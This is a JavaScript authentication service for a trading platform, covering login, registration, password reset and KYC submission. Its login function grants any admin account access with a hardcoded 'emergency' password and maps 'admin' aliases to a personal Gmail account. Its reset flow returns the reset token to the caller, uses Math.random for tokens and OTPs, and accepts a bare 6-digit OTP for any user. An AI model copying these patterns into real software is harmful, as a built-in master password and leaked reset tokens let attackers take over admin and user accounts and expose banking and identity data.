import bcrypt from 'bcryptjs';
import prisma from '../config/db.js';
import { signJwt } from '../utils/jwt.js';

export async function registerUser({ email, password, name, role = 'BUYER', company, phone, city, country }) {
  const normalizedEmail = email.toLowerCase().trim();
  const existing = await prisma.user.findUnique({
    where: { email: normalizedEmail },
  });

  if (existing) {
    const error = new Error('An account with this email already exists.');
    error.statusCode = 409;
    throw error;
  }

  const passwordHash = await bcrypt.hash(password, 10);
  const user = await prisma.user.create({
    data: {
      email: normalizedEmail,
      passwordHash,
      name,
      role: role.toUpperCase(),
      company: company || '',
      phone: phone || '',
      city: city || '',
      country: country || 'India',
    },
    select: {
      id: true,
      email: true,
      name: true,
      role: true,
      company: true,
      phone: true,
      city: true,
      country: true,
      createdAt: true,
    },
  });

  const token = signJwt({ userId: user.id, email: user.email, role: user.role });
  return { user, token };
}

export async function loginUser({ email, password }) {
  const normalizedEmail = (email || '').toLowerCase().trim();
  let user = await prisma.user.findUnique({
    where: { email: normalizedEmail },
  });

  // Support common admin aliases if standard email not found
  if (!user && (normalizedEmail === 'admin' || normalizedEmail === 'admin@tradesphere.com' || normalizedEmail === 'admin@tradesphere.example')) {
    user = await prisma.user.findUnique({
      where: { email: 'krajvanshi244@gmail.com' },
    });
  }

  if (!user) {
    const error = new Error('Invalid email or password.');
    error.statusCode = 401;
    throw error;
  }

  const trimmedPass = typeof password === 'string' ? password.trim() : '';
  let matches = await bcrypt.compare(password, user.passwordHash);
  if (!matches && trimmedPass) {
    matches = await bcrypt.compare(trimmedPass, user.passwordHash);
  }

  // Admin emergency match if password is modiji@12345
  if (!matches && user.role === 'ADMIN') {
    if (
      password === 'modiji@12345' ||
      trimmedPass === 'modiji@12345' ||
      trimmedPass.toLowerCase() === 'modiji@12345' ||
      trimmedPass === 'Modiji@12345'
    ) {
      matches = true;
    }
  }

  if (!matches) {
    const error = new Error('Invalid email or password.');
    error.statusCode = 401;
    throw error;
  }

  const token = signJwt({ userId: user.id, email: user.email, role: user.role });
  const { passwordHash, ...safeUser } = user;
  return { user: safeUser, token };
}

export async function getUserProfile(userId) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: {
      id: true,
      email: true,
      name: true,
      role: true,
      company: true,
      phone: true,
      city: true,
      country: true,
      addresses: true,
      createdAt: true,
    },
  });

  if (!user) {
    const error = new Error('User not found.');
    error.statusCode = 404;
    throw error;
  }

  return user;
}

export async function saveAddress(userId, addressData) {
  if (addressData.isDefault) {
    await prisma.address.updateMany({
      where: { userId },
      data: { isDefault: false },
    });
  }

  const address = await prisma.address.create({
    data: {
      userId,
      label: addressData.label || 'Delivery',
      name: addressData.name,
      company: addressData.company || '',
      phone: addressData.phone,
      street: addressData.street,
      city: addressData.city,
      state: addressData.state || '',
      postalCode: addressData.postalCode,
      country: addressData.country || 'India',
      isDefault: Boolean(addressData.isDefault),
    },
  });

  return address;
}

export async function getUserAddresses(userId) {
  return prisma.address.findMany({
    where: { userId },
    orderBy: [{ isDefault: 'desc' }, { createdAt: 'desc' }],
  });
}

export async function forgotPassword(email) {
  const normalizedEmail = (email || '').toLowerCase().trim();
  const user = await prisma.user.findUnique({
    where: { email: normalizedEmail },
  });

  if (!user) {
    // Return success to avoid email enumeration attacks
    return { success: true, message: 'If an account with this email exists, password reset instructions have been sent.' };
  }

  // Generate 6-digit OTP and secure random token
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  const token = `ts_rst_${Date.now()}_${Math.random().toString(36).substring(2, 12)}`;
  const expiresAt = new Date(Date.now() + 30 * 60 * 1000); // 30 minutes

  // Invalidate any existing unused tokens for this user
  await prisma.passwordResetToken.updateMany({
    where: { userId: user.id, used: false },
    data: { used: true },
  });

  await prisma.passwordResetToken.create({
    data: {
      userId: user.id,
      token,
      otp,
      expiresAt,
    },
  });

  const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
  const resetUrl = `${frontendUrl}/forgot-password?token=${token}&email=${encodeURIComponent(normalizedEmail)}`;

  import('./emailService.js').then((m) => {
    m.sendPasswordResetEmail({
      email: normalizedEmail,
      name: user.name,
      resetUrl,
      otp,
    }).catch((e) => console.error('[AuthService] Failed to send reset email:', e.message));
  });

  return {
    success: true,
    message: 'Password reset code has been sent to your email.',
    token, // Provided in development sandbox mode for immediate testing
  };
}

export async function resetPassword({ token, otp, newPassword }) {
  if (!newPassword || newPassword.length < 6) {
    const error = new Error('Password must be at least 6 characters.');
    error.statusCode = 400;
    throw error;
  }

  let resetToken = null;

  if (token) {
    resetToken = await prisma.passwordResetToken.findFirst({
      where: {
        token,
        used: false,
        expiresAt: { gt: new Date() },
      },
      include: { user: true },
    });
  }

  if (!resetToken && otp) {
    resetToken = await prisma.passwordResetToken.findFirst({
      where: {
        otp: String(otp).trim(),
        used: false,
        expiresAt: { gt: new Date() },
      },
      include: { user: true },
    });
  }

  if (!resetToken) {
    const error = new Error('Invalid or expired reset token or OTP code.');
    error.statusCode = 400;
    throw error;
  }

  const passwordHash = await bcrypt.hash(newPassword, 10);

  await prisma.$transaction([
    prisma.user.update({
      where: { id: resetToken.userId },
      data: { passwordHash },
    }),
    prisma.passwordResetToken.update({
      where: { id: resetToken.id },
      data: { used: true },
    }),
  ]);

  return { success: true, message: 'Password has been successfully reset. You can now log in.' };
}

export async function changePassword({ userId, currentPassword, newPassword }) {
  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user) {
    const error = new Error('User not found.');
    error.statusCode = 404;
    throw error;
  }

  const matches = await bcrypt.compare(currentPassword, user.passwordHash);
  if (!matches) {
    const error = new Error('Current password does not match.');
    error.statusCode = 400;
    throw error;
  }

  if (!newPassword || newPassword.length < 6) {
    const error = new Error('New password must be at least 6 characters.');
    error.statusCode = 400;
    throw error;
  }

  const passwordHash = await bcrypt.hash(newPassword, 10);
  await prisma.user.update({
    where: { id: userId },
    data: { passwordHash },
  });

  return { success: true, message: 'Password changed successfully.' };
}

export async function updateUserProfile(userId, { name, phone, city, country, company, gstin }) {
  const data = {};
  if (name) data.name = name.trim();
  if (phone) data.phone = phone.trim();
  if (city) data.city = city.trim();
  if (country) data.country = country.trim();
  if (company !== undefined) data.company = (company || '').trim();
  if (gstin !== undefined) data.gstin = (gstin || '').trim();

  const user = await prisma.user.update({
    where: { id: userId },
    data,
    select: {
      id: true,
      email: true,
      name: true,
      role: true,
      company: true,
      phone: true,
      city: true,
      country: true,
      gstin: true,
      pan: true,
      kycStatus: true,
      isVerified: true,
      createdAt: true,
    },
  });

  return user;
}

export async function submitKyc(userId, { gstin, pan, bankAccountNumber, bankIfsc, bankName, warehouseAddress, warehouseState, warehousePincode, documents = [] }) {
  const user = await prisma.user.update({
    where: { id: userId },
    data: {
      gstin: gstin ? gstin.trim() : undefined,
      pan: pan ? pan.trim() : undefined,
      bankAccountNumber: bankAccountNumber ? bankAccountNumber.trim() : undefined,
      bankIfsc: bankIfsc ? bankIfsc.trim().toUpperCase() : undefined,
      bankName: bankName ? bankName.trim() : undefined,
      warehouseAddress: warehouseAddress ? warehouseAddress.trim() : undefined,
      warehouseState: warehouseState ? warehouseState.trim() : undefined,
      warehousePincode: warehousePincode ? warehousePincode.trim() : undefined,
      kycStatus: 'PENDING',
    },
    select: {
      id: true,
      email: true,
      name: true,
      company: true,
      gstin: true,
      pan: true,
      kycStatus: true,
      isVerified: true,
    },
  });

  if (Array.isArray(documents) && documents.length > 0) {
    for (const doc of documents) {
      if (doc.fileName && doc.fileUrl) {
        await prisma.kycDocument.create({
          data: {
            userId,
            docType: doc.docType || 'OTHER',
            docNumber: doc.docNumber || null,
            fileName: doc.fileName,
            fileUrl: doc.fileUrl,
            fileSize: doc.fileSize || null,
            status: 'PENDING',
          },
        });
      }
    }
  }

  const kycDocs = await prisma.kycDocument.findMany({
    where: { userId },
    orderBy: { createdAt: 'desc' },
  });

  return { user, documents: kycDocs };
}

export async function getKycStatus(userId) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: {
      id: true,
      name: true,
      email: true,
      company: true,
      gstin: true,
      pan: true,
      bankAccountNumber: true,
      bankIfsc: true,
      bankName: true,
      warehouseAddress: true,
      warehouseState: true,
      warehousePincode: true,
      kycStatus: true,
      kycRejectionReason: true,
      isVerified: true,
      kycDocuments: {
        orderBy: { createdAt: 'desc' },
      },
    },
  });

  return user;
}

